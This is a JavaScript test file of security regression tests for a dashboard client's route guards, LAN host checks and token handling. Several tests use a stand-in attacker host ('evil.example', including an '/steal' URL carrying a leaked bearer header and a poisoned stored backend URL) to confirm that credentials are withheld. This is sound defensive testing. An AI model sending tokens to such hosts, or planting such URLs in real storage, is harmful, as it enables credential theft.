/**
 * Security regression tests for the dashboard client (review findings W1–W4, W7).
 */
import React, { act } from 'react';
import { createRoot } from 'react-dom/client';
import { MemoryRouter, Routes, Route } from 'react-router-dom';
import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';

globalThis.IS_REACT_ACT_ENVIRONMENT = true;

let mockRole = 'viewer';
vi.mock('../context/AuthContext', () => ({
  useAuth: () => ({ user: { role: mockRole } }),
}));

import { apiFetch, isLocalOrLanHost, isTrustedApiUrl, refreshSession } from '../services/api';
import { authService } from '../services/auth';
import { clearSession, getAccessToken, setSession } from '../services/session';
import { ROUTE_ROLES, canAccessTab } from '../auth/routeAccess';
import RequireRole from '../auth/RequireRole';
import { getDefaultTabForRole, TAB_TO_PATH } from '../App';

const ROLES = ['admin', 'manager', 'agent', 'developer', 'viewer'];

function jsonResponse(body, status = 200) {
  return new Response(JSON.stringify(body), { status, headers: { 'Content-Type': 'application/json' } });
}

describe('route access (W2)', () => {
  it("every role's default landing tab is accessible to that role (no redirect loops)", () => {
    for (const role of ROLES) {
      expect(canAccessTab(role, getDefaultTabForRole(role))).toBe(true);
    }
  });

  it('privileged consoles are limited to developer/admin', () => {
    for (const tab of ['developer_console', 'ai_customization', 'n8n_monitoring', 'knowledge']) {
      expect(ROUTE_ROLES[tab].sort()).toEqual(['admin', 'developer']);
      for (const role of ['viewer', 'agent', 'manager']) expect(canAccessTab(role, tab)).toBe(false);
    }
  });

  it('unknown roles get nothing', () => {
    for (const tab of Object.keys(ROUTE_ROLES)) {
      expect(canAccessTab('guest', tab)).toBe(false);
      expect(canAccessTab(undefined, tab)).toBe(false);
    }
  });

  it('every guarded tab maps to a real path', () => {
    for (const tab of Object.keys(ROUTE_ROLES)) expect(TAB_TO_PATH[tab]).toMatch(/^\//);
  });
});

describe('<RequireRole> (W2)', () => {
  let container;
  let root;

  beforeEach(() => {
    container = document.createElement('div');
    document.body.appendChild(container);
    root = createRoot(container);
  });

  afterEach(() => {
    act(() => root.unmount());
    container.remove();
  });

  function renderAt(path, role) {
    mockRole = role;
    act(() => {
      root.render(
        <MemoryRouter initialEntries={[path]}>
          <Routes>
            <Route
              path="/developer"
              element={<RequireRole tab="developer_console" fallbackPath="/properties"><div>DEV CONSOLE</div></RequireRole>}
            />
            <Route path="/properties" element={<div>PROPERTIES</div>} />
          </Routes>
        </MemoryRouter>
      );
    });
    return container.textContent;
  }

  it('redirects a viewer who types /developer', () => {
    expect(renderAt('/developer', 'viewer')).toBe('PROPERTIES');
  });

  it('renders the console for a developer', () => {
    expect(renderAt('/developer', 'developer')).toBe('DEV CONSOLE');
  });
});

describe('LAN host classification (W7)', () => {
  it.each([
    ['172.16.0.1', true],
    ['172.31.255.1', true],
    ['172.15.0.1', false],
    ['172.32.0.1', false],
    ['172.100.4.2', false],
    ['10.1.2.3', true],
    ['192.168.1.5', true],
    ['localhost', true],
    ['8.8.8.8', false],
    ['evil.com', false],
  ])('%s -> %s', (host, expected) => {
    expect(isLocalOrLanHost(host)).toBe(expected);
  });
});

describe('credential handling (W1, W3, W4)', () => {
  let fetchMock;

  beforeEach(() => {
    localStorage.clear();
    clearSession();
    fetchMock = vi.fn();
    vi.stubGlobal('fetch', fetchMock);
  });

  afterEach(() => {
    vi.unstubAllGlobals();
    clearSession();
  });

  it('never trusts arbitrary origins', () => {
    expect(isTrustedApiUrl('https://evil.example/api/v1/auth/me')).toBe(false);
    expect(isTrustedApiUrl('/api/v1/projects')).toBe(true);
  });

  it('ignores a poisoned stored backend URL', () => {
    localStorage.setItem('glg_working_backend', 'https://evil.example');
    localStorage.setItem('glg_api_base_url', 'https://evil.example');
    expect(isTrustedApiUrl('https://evil.example/x')).toBe(false);
  });

  it('attaches the bearer token only to trusted origins and never a service secret', async () => {
    setSession('user-access-token', { role: 'agent' });
    fetchMock.mockResolvedValue(jsonResponse({ ok: true }));

    await apiFetch('/api/v1/projects');
    const [, trustedOpts] = fetchMock.mock.calls[0];
    expect(trustedOpts.headers.Authorization).toBe('Bearer user-access-token');
    // The client must never send a service credential (the CI bundle gate enforces this too).
    expect(Object.keys(trustedOpts.headers).some((h) => /automation/i.test(h))).toBe(false);

    await apiFetch('https://evil.example/steal', { headers: { Authorization: 'Bearer leaked' } });
    const [, untrustedOpts] = fetchMock.mock.calls[1];
    expect(untrustedOpts.headers.Authorization).toBeUndefined();
  });

  it('login keeps tokens out of web storage', async () => {
    fetchMock.mockResolvedValue(
      jsonResponse({ access_token: 'acc', refresh_token: 'ref', user: { email: 'a@b.c', role: 'agent' } })
    );
    await authService.login('a@b.c', 'pw');

    expect(getAccessToken()).toBe('acc');
    for (const store of [localStorage, sessionStorage]) {
      for (let i = 0; i < store.length; i += 1) {
        const value = store.getItem(store.key(i));
        expect(value).not.toContain('acc');
        expect(value).not.toContain('ref');
      }
    }
    expect(localStorage.getItem('glg_refresh_token')).toBeNull();
    expect(localStorage.getItem('glg_token')).toBeNull();
  });

  it('refreshes once on 401 and retries with the new token', async () => {
    setSession('expired', { role: 'agent' });
    fetchMock
      .mockResolvedValueOnce(new Response('', { status: 401 }))
      .mockResolvedValueOnce(jsonResponse({ access_token: 'fresh', user: { role: 'agent' } }))
      .mockResolvedValueOnce(jsonResponse({ ok: true }));

    const resp = await apiFetch('/api/v1/projects');
    expect(resp.status).toBe(200);
    const [refreshUrl, refreshOpts] = fetchMock.mock.calls[1];
    expect(refreshUrl).toContain('/api/v1/auth/refresh');
    expect(refreshOpts.credentials).toBe('include');
    expect(refreshOpts.headers['X-GLG-Client']).toBeTruthy();
    expect(fetchMock.mock.calls[2][1].headers.Authorization).toBe('Bearer fresh');
  });

  it('concurrent refreshes share one request (rotation is single-use)', async () => {
    let resolveRefresh;
    fetchMock.mockReturnValue(new Promise((r) => { resolveRefresh = r; }));
    const a = refreshSession();
    const b = refreshSession();
    resolveRefresh(jsonResponse({ access_token: 'x', user: { role: 'agent' } }));
    await Promise.all([a, b]);
    expect(fetchMock).toHaveBeenCalledTimes(1);
  });

  it('purges credentials persisted by older releases', async () => {
    localStorage.setItem('glg_token', 'old');
    localStorage.setItem('glg_refresh_token', 'old');
    fetchMock.mockResolvedValue(new Response('', { status: 401 }));
    await authService.restoreSession();
    expect(localStorage.getItem('glg_token')).toBeNull();
    expect(localStorage.getItem('glg_refresh_token')).toBeNull();
  });
});
